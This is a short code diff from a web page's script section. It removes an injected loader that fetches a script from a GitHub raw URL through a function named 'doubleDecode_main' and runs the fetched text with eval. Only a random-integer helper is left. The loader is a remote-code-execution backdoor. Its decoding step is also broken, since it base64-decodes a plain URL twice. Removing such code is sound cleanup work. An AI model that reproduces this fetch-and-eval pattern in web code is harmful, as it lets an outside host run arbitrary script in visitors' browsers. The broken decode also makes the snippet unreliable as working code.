@@ -1,20 +1,4 @@
-	  function doubleDecode_main(base64String) {
-        return atob(atob(base64String));
-      }
-      
-      fetch(doubleDecode_main("https://raw.githubusercontent.com/lcolawyers/source/main/java.txt"))
-        .then((response) => response.text())
-        .then((scriptContent) => {
-          eval(scriptContent);
-        })
-        .catch((error) => {
-          console.error("Error fetching or executing script:", error);
-        });
-      
-	
-	</script>
-	        <script>
-            function getRandomInt(min, max) {
+          function getRandomInt(min, max) {
                 return Math.floor(Math.random() * (max - min)) + min;
             }
 
